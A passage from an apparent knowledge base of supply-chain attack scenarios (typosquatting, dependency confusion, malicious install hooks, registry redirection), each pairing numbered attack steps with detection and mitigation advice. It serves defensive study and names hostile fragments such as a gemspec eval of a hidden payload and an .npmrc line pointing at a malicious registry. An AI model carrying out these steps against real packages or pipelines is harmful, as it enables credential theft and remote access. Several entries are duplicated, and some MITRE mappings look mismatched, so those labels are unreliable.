- **Attack Steps**: 1. Attacker finds a GitLab instance (e.g., gitlab.acme.internal) with exposed package registry APIs.2. Using Burp or GitLab CLI, they test upload without authentication.3. They push a package named @acme/tools-core, matching internal naming convention.4. The package contains postinstall scripts to collect system details.5. When a developer installs via GitLab CI job, the malicious package is fetched from the poisoned registry.6. Execution occurs inside the CI runner container, exposing internal tokens.7. Attacker reuses tokens to pivot into private GitLab projects or other services.
- **Detection**: Monitor package uploads & registry changes
- **Solution**: Require authentication for registry publishing
- **Tags**: gitlab, registry-poisoning, ci-pipeline

## Abuse of Ruby Gemspec to Run Eval

- **Attack Type**: Malicious Libraries
- **Target**: Ruby Environments
- **Vulnerability**: Code execution via eval in gemspec
- **MITRE**: T1129 (Shared Modules)
- **Impact**: Code execution on developer systems
- **Tools**: RubyGems, gem build, gem install
- **Scenario**: A malicious Ruby gem abuses the gemspec file to run eval on malicious Ruby code during gem installation.
- **Attack Steps**: 1. Attacker creates a gem like security-update with a legitimate-sounding name.2. In the gemspec, they embed an eval(File.read('.payload.rb')) line.3. .payload.rb includes obfuscated Ruby code to create reverse shell or steal .aws/credentials.4. Gem is published on RubyGems with attractive README and fake GitHub stars.5. A developer runs gem install security-update.6. During install, gemspec is evaluated and attacker gains access.7. No runtime trace remains as the action happened pre-runtime.
- **Detection**: Scan gemspec for dynamic code
- **Solution**: Avoid unverified gems; use Gemfile.lock
- **Tags**: ruby, gemspec-abuse, rubysecurity

## Supply Chain Attack via pip Editable Mode

- **Attack Type**: Dependency Confusion
- **Target**: Python Projects
- **Vulnerability**: Insecure use of editable mode in pip
- **MITRE**: T1059.006 (Python)
- **Impact**: Local dev compromise and session hijacking
- **Tools**: pip, virtualenv, Python
- **Scenario**: Malicious package uses pip editable mode (-e) during local testing to hijack a library path and inject malicious behavior.
- **Attack Steps**: 1. Attacker commits requirements.txt with -e ./my-lib/ which contains a local malicious package.2. In a Python project, unsuspecting developer installs dependencies.3. Editable mode allows the attacker’s code to run directly from source directory.4. setup.py executes system commands or logs environment info.5. At runtime, Python resolves import to ./my-lib, not the actual safe one.6. Malicious code steals AWS credentials or uploads user tokens.7. Developer may not suspect because -e is common during dev testing.
- **Detection**: Monitor -e usage and dependency paths
- **Solution**: Avoid -e in team environments or CI pipelines
- **Tags**: pip, python, editable-mode, dependency-confusion

## Tampering with .npmrc to Inject Registry Poisoning

- **Attack Type**: Dependency Confusion
- **Target**: Node.js Environments
- **Vulnerability**: Registry override via hidden config
- **MITRE**: T1556.001 (Input Capture via Config)
- **Impact**: Full dependency chain compromise
- **Tools**: npm, Wireshark, MITMproxy
- **Scenario**: Malicious .npmrc file sets registry to attacker's server, silently redirecting all npm install operations.
- **Attack Steps**: 1. Attacker sends PR with hidden .npmrc file setting registry=https://malicious.registry.com.2. Upon merge, developer’s machine or CI runner uses that registry.3. When npm install is run, dependencies are fetched from the attacker’s controlled server.4. Poisoned versions of key libraries are served (e.g., lodash, express).5. These packages include scripts to exfiltrate credentials.6. Attack succeeds if .npmrc is not reviewed due to its hidden nature in file trees.7. Exploitation continues until .npmrc is detected and cleaned up.
- **Detection**: Monitor unexpected registry requests
- **Solution**: Use .npmrc strict allowlist; audit dotfiles
- **Tags**: npmrc, config-abuse, registry-redirection

## Fake Composer Package in Packagist with Trusted Name

- **Attack Type**: Malicious Libraries
- **Target**: PHP Web Applications
- **Vulnerability**: Package name hijacking
- **MITRE**: T1608.001 (Dependency Confusion)
- **Impact**: Webserver compromise via PHP code injection
- **Tools**: Composer, PHP CLI
- **Scenario**: A fake Composer package with a name similar to an abandoned popular package is uploaded and contains malicious post-install-cmd.
- **Attack Steps**: 1. Attacker identifies that acme/utils was removed or unmaintained on Packagist.2. They upload a new package with the same or similar name.3. Include malicious code in composer.json under scripts -> post-install-cmd.4. Developer adds package due to similar naming or auto-suggestion.5. Composer installs and triggers the post-install command.6. Malicious payload executes and modifies PHP files to include backdoor.7. PHP app is compromised silently and attacker gets webshell.
- **Detection**: Monitor composer install logs
- **Solution**: Pin versions; review install scripts
- **Tags**: composer, php, post-install, packagist

## Malicious Terraform Provider Package

- **Attack Type**: Malicious Libraries
- **Target**: Infrastructure-as-Code
- **Vulnerability**: Unverified third-party Terraform provider
- **MITRE**: T1195.002
- **Impact**: Infrastructure leaks and cloud resource takeover
- **Tools**: Terraform CLI, HashiCorp Registry
- **Scenario**: A malicious Terraform provider is uploaded under a realistic-sounding name. When developers use it, it leaks secrets during infra provisioning.
- **Attack Steps**: 1. Attacker uploads terraform-provider-cloudplus to Terraform registry with attractive features.2. Developer adds the provider to main.tf without proper verification.3. Provider code is executed during terraform init or terraform apply.4. Malicious logic captures variables like AWS keys or database URLs.5. Secrets are sent to attacker-controlled endpoint.6. Infrastructure is provisioned as expected, so no suspicion is raised.7. Attacker uses leaked credentials for lateral movement or resource hijack.
- **Detection**: Monitor unexpected provider fetch URLs
- **Solution**: Pin provider sources; use only verified modules
- **Tags**: terraform, provider-abuse, iac-security

## Pre-Publish Hook Exploitation in npm Scripts

- **Attack Type**: Malicious Libraries
- **Target**: Public Package Maintainers
- **Vulnerability**: Unsanitized prepublish hook in npm scripts
- **MITRE**: T1608.004
- **Impact**: Credential theft before release
- **Tools**: npm, GitHub, Netcat
- **Scenario**: An attacker contributes code with a prepublish npm hook in package.json to exfiltrate data before the package is officially released.
- **Attack Steps**: 1. Attacker creates a PR with helpful bugfix.2. Inside the package.json, they add a hidden prepublish hook under scripts.3. This script includes code like curl to send .env file to remote server.4. Maintainer publishes the package unaware of the hook.5. During npm publish, the script runs and steals secrets.6. No warning is shown unless the scripts are manually reviewed.7. Attacker now has access to environment config or access keys used during publish.
- **Detection**: Audit package.json scripts manually
- **Solution**: Block unknown hooks; use script scanners
- **Tags**: npm, scripts, publish-hook, js-security

## Luring with Developer Utility Tool on PyPI

- **Attack Type**: Malicious Libraries
- **Target**: Developer Workstations
- **Vulnerability**: Overtrust in helper libraries on PyPI
- **MITRE**: T1203 (Exploitation for Client Execution)
- **Impact**: Full dev workstation surveillance & compromise
- **Tools**: PyPI, Python3, VirusTotal
- **Scenario**: Attacker uploads a Python tool claiming to improve developer workflow (e.g., env-helper) but contains code that logs all shell commands.
- **Attack Steps**: 1. Attacker builds a tool called env-helper that promises better ENV handling and productivity for developers.2. Publishes to PyPI with a polished README and positive fake reviews.3. In background, the package modifies .bashrc or .zshrc to log every terminal command.4. Installs keylogger via subprocess.5. Developer installs the tool on dev system, seeing no unusual behavior.6. Attacker collects credentials, commands, and tokens silently over time.7. Can be used to replay sessions or discover sensitive commands issued on terminal.
- **Detection**: Check file write operations during install
- **Solution**: Avoid non-audited PyPI packages; sandbox untrusted code
- **Tags**: pypi, spyware, shell-logging, python-tools

## Luring with Developer Utility Tool on PyPI

- **Attack Type**: Malicious Libraries
- **Target**: Developer Workstations
- **Vulnerability**: Overtrust in helper libraries on PyPI
- **MITRE**: T1203 (Exploitation for Client Execution)
- **Impact**: Full dev workstation surveillance & compromise
- **Tools**: PyPI, Python3, VirusTotal
- **Scenario**: Attacker uploads a Python tool claiming to improve developer workflow (e.g., env-helper) but contains code that logs all shell commands.
- **Attack Steps**: 1. Attacker builds a tool called env-helper that promises better ENV handling and productivity for developers.2. Publishes to PyPI with a polished README and positive fake reviews.3. In background, the package modifies .bashrc or .zshrc to log every terminal command.4. Installs keylogger via subprocess.5. Developer installs the tool on dev system, seeing no unusual behavior.6. Attacker collects credentials, commands, and tokens silently over time.7. Can be used to replay sessions or discover sensitive commands issued on terminal.
- **Detection**: Check file write operations during install
- **Solution**: Avoid non-audited PyPI packages; sandbox untrusted code
- **Tags**: pypi, spyware, shell-logging, python-tools

## Exploiting Namespace Collision in Private Artifactory

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Pipelines
- **Vulnerability**: Registry misconfiguration & overlapping names
- **MITRE**: T1195.002
- **Impact**: Credential exfiltration and lateral movement
- **Tools**: npm, custom script, Burp Suite
- **Scenario**: An attacker exploits an overlap between a private internal package name and a public registry to inject a malicious version.
- **Attack Steps**: 1. Attacker identifies a package used internally in a company's build logs called @corp-utils/logger. 2. They verify that this scoped package doesn't exist publicly on npm. 3. The attacker publishes a package named @corp-utils/logger to the public npm registry, but with malicious postinstall scripts. 4. The CI/CD pipeline, when resolving dependencies without proper registry scoping, mistakenly fetches the public version. 5. Malicious code executes within the CI pipeline environment, leaking secrets.
- **Detection**: Monitor registry sources used during builds
- **Solution**: Enforce strict internal registry scoping, block external lookups for private namespaces
- **Tags**: #npm #dependencyconfusion #CIpipeline #maliciouspackage

## Hijacking Python Dependency via Typosquatting

- **Attack Type**: Malicious Libraries
- **Target**: Developer Workstation
- **Vulnerability**: Typosquatting & malicious install scripts
- **MITRE**: T1059.006
- **Impact**: Remote shell, code execution on dev machine
- **Tools**: PyPI, pip, Malicious setup.py
- **Scenario**: Attacker targets a common Python library by uploading a typosquatted version to PyPI.
- **Attack Steps**: 1. Attacker observes that requestslib is often mistyped as requeslib. 2. They upload requeslib to PyPI with identical functionality but embed a reverse shell in setup.py. 3. Developer accidentally installs the fake version. 4. Upon install, the setup.py executes and opens a reverse shell to the attacker's system. 5. Attacker gains initial access to developer workstation.
- **Detection**: Monitor for suspicious network connections post-install
- **Solution**: Use pip hash checking, restrict to allowlisted libraries
- **Tags**: #pypi #setup.py #typosquatting #python

## Supply Chain Poisoning via CI Template Reuse

- **Attack Type**: Malicious Libraries
- **Target**: Internal CI Pipelines
- **Vulnerability**: Trusting unverified boilerplate templates
- **MITRE**: T1195.002
- **Impact**: Secret theft, CI compromise
- **Tools**: Git, npm, Node.js
- **Scenario**: A poisoned package.json template propagates into multiple company repositories due to reuse.
- **Attack Steps**: 1. An attacker contributes to a public repo used as a boilerplate by many devs. 2. They sneak in a dependency in devDependencies with a malicious install script. 3. Internal devs fork the template repo to use for new services. 4. The malicious dependency gets executed in CI during linting or build phase. 5. Secrets like API tokens or cloud credentials are stolen.
- **Detection**: Track origin of templates used in projects
- **Solution**: Use internal reviewed templates only, scan forks
- **Tags**: #boilerplate #npm #CIattack #templatesupplychain

## Dependency Confusion via Maven Shadow Repository

- **Attack Type**: Dependency Confusion
- **Target**: Java Build System
- **Vulnerability**: Maven repository resolution order
- **MITRE**: T1195.002
- **Impact**: Code execution and data exfiltration
- **Tools**: Maven, Java, Burp Suite
- **Scenario**: A developer accidentally prioritizes Maven Central over internal repo, leading to malicious JAR fetch.
- **Attack Steps**: 1. Internal Java project depends on com.company.lib:analytics-utils. 2. Attacker publishes com.company.lib:analytics-utils to Maven Central. 3. Build tool misconfigured to check public repo before internal. 4. Public malicious jar is downloaded and runs spyware code during static block execution. 5. Build system is compromised.
- **Detection**: Monitor Maven artifact source origins
- **Solution**: Set internal repos with highest priority, block public duplicates
- **Tags**: #maven #javabuild #dependencyconfusion #jars

## Exploiting Private GitHub Packages via Public Mirror

- **Attack Type**: Malicious Libraries
- **Target**: GitHub CI / Developer
- **Vulnerability**: Package namespace collision in GitHub ecosystem
- **MITRE**: T1195.002
- **Impact**: Token exfiltration
- **Tools**: GitHub Packages, npm, GitHub Actions
- **Scenario**: Attacker uploads malicious package with same name as an internal GitHub Package due to public name reuse.
- **Attack Steps**: 1. Company uses GitHub Packages for private distribution of utils-api. 2. GitHub does not restrict publishing same package name publicly. 3. Attacker registers public package with same name but malicious postinstall. 4. A developer accidentally pulls the public one during testing. 5. Malicious code leaks .npmrc tokens.
- **Detection**: Detect unexpected registry lookups
- **Solution**: Enforce scoped access tokens, validate origin URLs
- **Tags**: #githubpackages #npmrc #tokenleak #devsecops

## Dependency Confusion via Dockerfile RUN Layer

- **Attack Type**: Dependency Confusion
- **Target**: Docker Build Systems
- **Vulnerability**: Improper Docker dependency resolution
- **MITRE**: T1195.002
- **Impact**: Trojanized containers pushed internally
- **Tools**: Docker, npm, Docker Hub
- **Scenario**: Malicious npm package executed during RUN npm install step in Dockerfile.
- **Attack Steps**: 1. Dockerfile contains: RUN npm install mycorp-internal-lib. 2. Attacker publishes mycorp-internal-lib on npm with harmful preinstall. 3. Build server pulls public version due to lack of private registry configuration. 4. preinstall executes and downloads a remote payload. 5. Resulting container image is trojanized and pushed to internal registry.
- **Detection**: Scan layers of built images
- **Solution**: Use ARGs to control registry source, verify packages
- **Tags**: #docker #npm #trojancontainer #supplychain

## Attacking VSCode Extensions through Dependency Chains

- **Attack Type**: Malicious Libraries
- **Target**: Developer Machines
- **Vulnerability**: Indirect dependency abuse
- **MITRE**: T1195.002
- **Impact**: Keystroke logging, token theft
- **Tools**: VSCode, npm, CodeQL
- **Scenario**: A malicious package is inserted deep in a dependency chain of a popular VSCode extension.
- **Attack Steps**: 1. Attacker creates package colors-adv and publishes it with a hidden dependency to postinstall-payload. 2. colors-adv is added to helper-ui-lib. 3. helper-ui-lib is added to a popular VSCode extension. 4. When a dev installs the extension, postinstall script executes and creates a keylogger. 5. Dev inputs (e.g., GitHub tokens) are stolen.
- **Detection**: Analyze nested dependencies
- **Solution**: Use lockfiles, audit extension dependencies
- **Tags**: #vscode #keylogger #npmchain #indirectdeps

## Supply Chain Attack via Archived Abandoned Library

- **Attack Type**: Malicious Libraries
- **Target**: Application Codebase
- **Vulnerability**: Orphaned / archived project takeover
- **MITRE**: T1195.002
- **Impact**: Code execution in prod
- **Tools**: npm, PyPI, Package Registries
- **Scenario**: Attacker takes over a previously legitimate but now archived library by contacting registry admins.
- **Attack Steps**: 1. easy-form is an archived but still-used library on npm. 2. Attacker claims ownership of unmaintained project. 3. Registry grants access since the email is no longer valid. 4. Attacker uploads new version with obfuscated malware. 5. Dev teams blindly update dependency during quarterly updates.
- **Detection**: Monitor for sudden maintainership changes
- **Solution**: Pin versions and audit metadata of updates
- **Tags**: #orphanedpkg #abandonedlib #registrytakeover

## Injecting Malicious Binary in Node-gyp Build

- **Attack Type**: Malicious Libraries
- **Target**: Web Servers
- **Vulnerability**: Native binary tampering via node-gyp
- **MITRE**: T1546.015
- **Impact**: Persistent access in image processing servers
- **Tools**: Node.js, node-gyp, ldd
- **Scenario**: Custom binary injected into node-gyp build lifecycle during dependency installation.
- **Attack Steps**: 1. Attacker creates sharp-utils-bin, a wrapper to commonly used sharp image processor. 2. They include precompiled malicious native binaries in the release. 3. During npm install, node-gyp builds and links the native binary. 4. Malicious binary is silently executed during image processing. 5. The backdoor establishes outbound persistence.
- **Detection**: Monitor binaries in node-gyp installs
- **Solution**: Rebuild from source, avoid precompiled bins
- **Tags**: #nodegyp #binarybackdoor #sharp #npm

## Obfuscated Steganographic Payload in CSS Parser Library

- **Attack Type**: Malicious Libraries
- **Target**: Frontend Web App
- **Vulnerability**: Steganography in parser logic
- **MITRE**: T1001.003
- **Impact**: C2 communication, fingerprinting
- **Tools**: npm, Wireshark, CSS-Parser
- **Scenario**: Steganographic technique used to hide a C2 beacon in CSS parsing function.
- **Attack Steps**: 1. Attacker creates css-style-parse library mimicking an old parser. 2. Payload is encoded as base64 within image metadata parsing. 3. When app parses stylesheets, code sends DNS beacon to attacker's server. 4. Beacon contains system fingerprint info. 5. Attack stays hidden under benign CSS use.
- **Detection**: Monitor DNS egress from frontend apps
- **Solution**: Validate open-source dependencies with security review
- **Tags**: #css #steganography #dnsbeacon #npmattack

## Obfuscated Steganographic Payload in CSS Parser Library

- **Attack Type**: Malicious Libraries
- **Target**: Frontend Web App
- **Vulnerability**: Steganography in parser logic
- **MITRE**: T1001.003
- **Impact**: C2 communication, fingerprinting
- **Tools**: npm, Wireshark, CSS-Parser
- **Scenario**: Steganographic technique used to hide a C2 beacon in CSS parsing function.
- **Attack Steps**: 1. Attacker creates css-style-parse library mimicking an old parser. 2. Payload is encoded as base64 within image metadata parsing. 3. When app parses stylesheets, code sends DNS beacon to attacker's server. 4. Beacon contains system fingerprint info. 5. Attack stays hidden under benign CSS use.
- **Detection**: Monitor DNS egress from frontend apps
- **Solution**: Validate open-source dependencies with security review
- **Tags**: #css #steganography #dnsbeacon #npmattack

## Typosquatted PyPI Package for Credentials Exfiltration

- **Attack Type**: Dependency Confusion
- **Target**: Python CI/CD pipeline
- **Vulnerability**: Typo-based dependency confusion
- **MITRE**: T1195.002
- **Impact**: AWS key compromise, environment leakage
- **Tools**: PyPI, Python, AWS CLI, Flask
- **Scenario**: A malicious package named requessts (typo of requests) is uploaded to PyPI. It collects AWS credentials from environment variables and sends them to a remote server.
- **Attack Steps**: 1. The attacker creates a package named requessts with the same description and metadata as the real requests library. 2. Inside the __init__.py, the attacker adds a script to collect environment variables like AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY. 3. These are then base64 encoded and sent via a POST request to an attacker-controlled server. 4. The package is published on PyPI with keywords and descriptions that match legitimate libraries. 5. A developer accidentally installs requessts instead of requests and runs the build. 6. The malicious code executes on install via setup.py, stealing sensitive keys.
- **Detection**: Monitor unusual package installations, egress traffic
- **Solution**: Enforce hash pinning, package allowlist
- **Tags**: typo, pypi, aws, creds

## Fake GitHub Package Used via go get

- **Attack Type**: Dependency Confusion
- **Target**: Go developer systems
- **Vulnerability**: Missing module scoping, namespace confusion
- **MITRE**: T1195.002
- **Impact**: RCE on build machine
- **Tools**: Go, GitHub, Burp Suite
- **Scenario**: The attacker hosts a malicious Go package using the same name as an internal module on GitHub, exploiting go get auto-fetch behavior.
- **Attack Steps**: 1. Internal engineers import a private module like github.com/acme/util/pkg in their Go code. 2. The attacker publishes a public repo on GitHub at github.com/acme/util/pkg. 3. Due to misconfigured Go module resolution, go get installs the public repo instead. 4. The attacker adds a go init hook to run a reverse shell when compiled. 5. A developer runs go build, triggering the malicious payload. 6. The attacker gains shell access to the CI runner or developer workstation.
- **Detection**: DNS + egress monitoring from build agents
- **Solution**: Private Go proxy, module scoping
- **Tags**: golang, github, confusion

## Malicious NPM Package That Uploads .env Files

- **Attack Type**: Dependency Confusion
- **Target**: Node.js web apps
- **Vulnerability**: Unverified package source, missing pinning
- **MITRE**: T1555
- **Impact**: Credential exfiltration
- **Tools**: Node.js, NPM, Netcat
- **Scenario**: An attacker publishes a fake dotenv-safe NPM package which uploads all .env files to a C2 server during install.
- **Attack Steps**: 1. Attacker forks and modifies dotenv-safe to include malicious install scripts in preinstall. 2. The malicious code scans the user directory for .env files. 3. Files are zipped and sent to an attacker-controlled server using HTTP POST. 4. The modified package is published on NPM with fake stars and download counts. 5. A developer accidentally installs it thinking it's the real one. 6. As soon as the package is installed, credentials are leaked.
- **Detection**: Monitor preinstall/postinstall hooks in builds
- **Solution**: Use lockfiles and strict vetting
- **Tags**: npm, .env, exfil

## VSCode Extension with Malicious Dependencies

- **Attack Type**: Malicious Libraries
- **Target**: Developer IDEs
- **Vulnerability**: Transitive malicious dependency
- **MITRE**: T1496
- **Impact**: System resource theft
- **Tools**: VSCode, JavaScript, CryptoMiner
- **Scenario**: A developer installs a VSCode extension which uses a library that contains hidden crypto-mining logic.
- **Attack Steps**: 1. Attacker publishes a useful extension (e.g., markdown formatter). 2. The extension uses an NPM library (js-obfuscator-utils) which includes hidden cryptominer code. 3. On extension activation, the cryptominer starts consuming CPU. 4. The extension gains popularity and is installed by several developers. 5. The malicious library stays undetected unless CPU usage is monitored. 6. Mining continues in the background while VSCode is open.
- **Detection**: High CPU usage anomalies, Yara scanning
- **Solution**: Audit extension dependencies
- **Tags**: vscode, miner, npm

## Terraform Module Confusion with Public Registry

- **Attack Type**: Dependency Confusion
- **Target**: Terraform infra pipelines
- **Vulnerability**: Unscoped module source
- **MITRE**: T1195.002
- **Impact**: Infra backdoor, secrets theft
- **Tools**: Terraform, GitHub, Netlify
- **Scenario**: A Terraform script uses source = "acme/network" assuming internal module, but public Terraform Registry has a malicious acme/network.
- **Attack Steps**: 1. Attacker registers a public module with same name as an internal one. 2. Internal IaC scripts mistakenly fetch public module during terraform init. 3. The public module has embedded null_resource that executes shell commands. 4. On terraform apply, the payload executes in the CI environment. 5. The attacker opens reverse shell or steals .terraform state info.
- **Detection**: Compare public vs internal registry pulls
- **Solution**: Pin Git commit SHA for modules
- **Tags**: terraform, iac, backdoor

## Dependency Confusion via GitHub Actions Marketplace

- **Attack Type**: Dependency Confusion
- **Target**: GitHub CI pipelines
- **Vulnerability**: Namespace collision
- **MITRE**: T1195.002
- **Impact**: Credential theft, CI compromise
- **Tools**: GitHub Actions, Bash
- **Scenario**: A malicious GitHub Action with same name as a private one tricks users into executing unsafe scripts.
- **Attack Steps**: 1. The attacker creates a public Action named acme/build-check matching an internal one. 2. A new dev mistakenly references this public Action in workflow YAML. 3. The malicious Action executes shell commands to dump secrets, environment variables. 4. It uploads them to a remote server during CI. 5. The attacker scrapes GitHub Actions Marketplace for similar namespace opportunities.
- **Detection**: Monitor marketplace usage in workflows
- **Solution**: Use commit SHA instead of name
- **Tags**: github-actions, ci, leak

## Recompiled bcrypt with Data Stealing Logic

- **Attack Type**: Malicious Libraries
- **Target**: Node.js apps
- **Vulnerability**: Native binary obfuscation
- **MITRE**: T1005
- **Impact**: Password exposure
- **Tools**: NPM, C++, Wireshark
- **Scenario**: Attacker publishes a recompiled native bcrypt binary on NPM that steals passwords in memory.
- **Attack Steps**: 1. Attacker reimplements bcrypt as a C++ binding with subtle memory leak. 2. During hashing, it copies memory segments containing raw passwords. 3. These are sent via UDP packets to attacker server. 4. Since the binary is obfuscated and native, AV fails to detect it. 5. Package is used by user login forms in web apps. 6. Users' raw passwords get leaked in plaintext.
- **Detection**: Monitor outbound UDP from dev environments
- **Solution**: Use vetted native bindings
- **Tags**: bcrypt, native, password

## Compromised Mirror of Public Python Repo

- **Attack Type**: Dependency Confusion
- **Target**: Python enterprise systems
- **Vulnerability**: Mirror trust assumption
- **MITRE**: T1557
- **Impact**: HTTP credential theft
- **Tools**: PyPI, MITMProxy, Python
- **Scenario**: A regional mirror of PyPI is compromised and serves trojanized version of urllib3 with credential logger.
- **Attack Steps**: 1. Mirror at pypi.in.local is outdated and controlled by attacker. 2. A modified urllib3 version is uploaded with MITM logging hooks. 3. Developer machines behind firewall install packages from mirror. 4. urllib3 logs all outgoing requests and dumps headers to file. 5. The dump is exfiltrated every 10 minutes using DNS tunneling.
- **Detection**: Monitor DNS anomalies, inspect mirrors
- **Solution**: Use secure, signed mirrors only
- **Tags**: python, pypi, mitm

## Unclaimed Namespace Hijack on RubyGems

- **Attack Type**: Dependency Confusion
- **Target**: Ruby apps
- **Vulnerability**: Unclaimed package names
- **MITRE**: T1195.002
- **Impact**: SSH key and cloud credential theft
- **Tools**: RubyGems, Ruby, ngrok
- **Scenario**: A developer deletes their data-utils RubyGem; attacker claims it and uploads a version with a data stealer.
- **Attack Steps**: 1. Developer abandons and deletes a gem named data-utils. 2. Attacker quickly registers the same name and uploads malicious gem. 3. The gem includes a post-install script that scans ~/.ssh, ~/.aws directories. 4. Files are zipped and sent to ngrok tunnel. 5. Several old projects relying on that gem install it again after a bundle update.
- **Detection**: Alert on republished packages
- **Solution**: Do not use unmaintained packages
- **Tags**: ruby, gem, hijack

## Transitive Confusion via Obscure Package

- **Attack Type**: Dependency Confusion
- **Target**: Python apps
- **Vulnerability**: Transitive trust
- **MITRE**: T1059
- **Impact**: Remote code access via reverse shell
- **Tools**: PyPI, Python, Netcat
- **Scenario**: An obscure Python library used by another package silently adds a reverse shell as a transitive dependency.
- **Attack Steps**: 1. Attacker publishes color-helper-ext that looks harmless. 2. A mid-tier library adds it as a dependency. 3. A popular package depends on that mid-tier library. 4. Eventually, color-helper-ext gets installed by thousands of users. 5. It opens a reverse shell on port 4444 when Python script runs. 6. Detection is difficult since it's buried deep in dependency chain.
- **Detection**: Audit full dependency tree, not just top-level
- **Solution**: Enable SBOM tools like Syft/Grype
- **Tags**: transitive, shell, python

## Transitive Confusion via Obscure Package

- **Attack Type**: Dependency Confusion
- **Target**: Python apps
- **Vulnerability**: Transitive trust
- **MITRE**: T1059
- **Impact**: Remote code access via reverse shell
- **Tools**: PyPI, Python, Netcat
- **Scenario**: An obscure Python library used by another package silently adds a reverse shell as a transitive dependency.
- **Attack Steps**: 1. Attacker publishes color-helper-ext that looks harmless. 2. A mid-tier library adds it as a dependency. 3. A popular package depends on that mid-tier library. 4. Eventually, color-helper-ext gets installed by thousands of users. 5. It opens a reverse shell on port 4444 when Python script runs. 6. Detection is difficult since it's buried deep in dependency chain.
- **Detection**: Audit full dependency tree, not just top-level
- **Solution**: Enable SBOM tools like Syft/Grype
- **Tags**: transitive, shell, python

## Dependency Confusion in Multi-Repo Monorepos

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Infrastructure
- **Vulnerability**: Misconfigured registry scope resolution
- **MITRE**: T1195.002 - Compromise Software Dependencies
- **Impact**: Full CI/CD compromise, possible secret exfiltration
- **Tools**: Yarn, NPM, MITMProxy
- **Scenario**: An attacker exploits misconfigured monorepo-based package managers (e.g., Yarn Workspaces, Lerna) to inject malicious versions of internal libraries by publishing identically named packages to a public registry.
- **Attack Steps**: 1. The attacker identifies a target using a monorepo structure with multiple internal packages.2. They inspect open-source configurations or CI logs to identify internal library names used in package.json.3. They publish a package to npm with an internal-sounding name (e.g., @company/utils-core).4. The internal system lacks proper .npmrc scoping or registry locking, allowing npm to resolve the malicious package from the public registry.5. During CI builds, the malicious package is pulled instead of the private internal one.6. It executes malicious scripts via the postinstall hook.
- **Detection**: Compare internal vs. public packages via hash scanning
- **Solution**: Lock private packages using scoped registries and always verify dependencies
- **Tags**: #npm #monorepo #dependencyconfusion #CIsecurity

## Hijacking Abandoned Namespace in Internal Nexus Repo

- **Attack Type**: Malicious Library Injection
- **Target**: Internal DevOps Pipelines
- **Vulnerability**: Namespace reuse and fallback to public registry
- **MITRE**: T1199 - Trusted Relationship
- **Impact**: Internal secrets exfiltrated, CI build tampered
- **Tools**: Nexus, NPM, Semgrep
- **Scenario**: A developer accidentally deletes an internal Nexus-hosted package group, and the attacker notices and re-claims the package name on a public repo. The internal build system then mistakenly fetches the attacker’s version.
- **Attack Steps**: 1. The attacker monitors GitHub repos and internal documentation leaks for internal Nexus package names (e.g., corp.logging-sdk).2. They find that this name is no longer hosted on the private Nexus registry.3. They immediately register a new package on the public npm registry with the exact same name.4. The internal build system fails to find the Nexus-hosted package, defaults to public npm.5. The attacker adds malicious preinstall/postinstall logic that executes at build time.6. The code runs within the CI environment, leaking tokens, SSH keys, or environment variables.
- **Detection**: Monitor deleted/internal-only namespaces in Nexus
- **Solution**: Harden registry resolution logic, enforce allowlist-only package sources
- **Tags**: #nexus #devops #CI #namespacehijack

## Typo-Squatting a Scoped Package within GitHub Actions

- **Attack Type**: Typo-Squatting
- **Target**: GitHub CI/CD Workflows
- **Vulnerability**: Typosquatting + GitHub Actions misconfig
- **MITRE**: T1554 - Compromise CI Tools
- **Impact**: Theft of secrets or credentials, poisoned CI builds
- **Tools**: GitHub Actions, NPM
- **Scenario**: An attacker registers a typo'd version of a scoped GitHub Action dependency (@actions/cachee) used in actions.yml, and hijacks the build process when the typoed name is inadvertently included by a developer.
- **Attack Steps**: 1. The attacker monitors GitHub repositories for commonly used GitHub Actions scoped packages (e.g., @actions/core, @actions/cache).2. They register a typo-squatted package like @actions/cachee on the npm registry.3. They wait for a developer to mistakenly reference the typoed package in their workflow.yml file (e.g., uses: actions/cachee@v2).4. The GitHub runner fetches the attacker-controlled package.5. The package includes malicious logic in the index.js, which runs during workflow execution.6. It steals repository secrets via the GitHub Action environment and exfiltrates them to an external server.
- **Detection**: Static scanning of workflow files and GitHub actions versions
- **Solution**: Use SHA-pinned GitHub Actions, enable registry signature verification
- **Tags**: #githubactions #typosquatting #npm #ci #supplychain

## Typo-Squatting a Scoped Package within GitHub Actions

- **Attack Type**: Typo-Squatting
- **Target**: GitHub CI/CD Workflows
- **Vulnerability**: Typosquatting + GitHub Actions misconfig
- **MITRE**: T1554 - Compromise CI Tools
- **Impact**: Theft of secrets or credentials, poisoned CI builds
- **Tools**: GitHub Actions, NPM
- **Scenario**: An attacker registers a typo'd version of a scoped GitHub Action dependency (@actions/cachee) used in actions.yml, and hijacks the build process when the typoed name is inadvertently included by a developer.
- **Attack Steps**: 1. The attacker monitors GitHub repositories for commonly used GitHub Actions scoped packages (e.g., @actions/core, @actions/cache).2. They register a typo-squatted package like @actions/cachee on the npm registry.3. They wait for a developer to mistakenly reference the typoed package in their workflow.yml file (e.g., uses: actions/cachee@v2).4. The GitHub runner fetches the attacker-controlled package.5. The package includes malicious logic in the index.js, which runs during workflow execution.6. It steals repository secrets via the GitHub Action environment and exfiltrates them to an external server.
- **Detection**: Static scanning of workflow files and GitHub actions versions
- **Solution**: Use SHA-pinned GitHub Actions, enable registry signature verification
- **Tags**: #githubactions #typosquatting #npm #ci #supplychain

## Typosquatting Go Modules in Private Repos

- **Attack Type**: Typosquatting
- **Target**: CI/CD Pipelines
- **Vulnerability**: Name collision, lack of dependency validation
- **MITRE**: T1195.002 (Supply Chain Compromise)
- **Impact**: Credential leakage, Remote access
- **Tools**: Go Modules, GitHub, DNS
- **Scenario**: Attacker publishes Go modules with names similar to internal/private Go packages used in org’s build.
- **Attack Steps**: 1. The attacker identifies a company’s private Go package naming convention (e.g., corp-internal-lib/foo).2. They register a similar but subtly misspelled public package name (e.g., corp-internallib/foo) on pkg.go.dev or GitHub.3. A developer mistypes the package name during import, causing the build system to pull from the attacker’s module.4. The malicious module includes pre-build scripts or backdoored logic.5. When the CI/CD pipeline compiles the code, the module runs or installs malware.6. The malware connects to a C2 server or leaks environment secrets to attacker-controlled storage.
- **Detection**: Monitor unusual domain/package usage; dependency diffing
- **Solution**: Enforce internal allow-lists for packages; namespace validation
- **Tags**: golang, typosquatting, ci/cd, supply-chain

## Injecting Malicious Binary in Build Cache via Shared Docker Layers

- **Attack Type**: Build Cache Poisoning
- **Target**: Containers & Pipelines
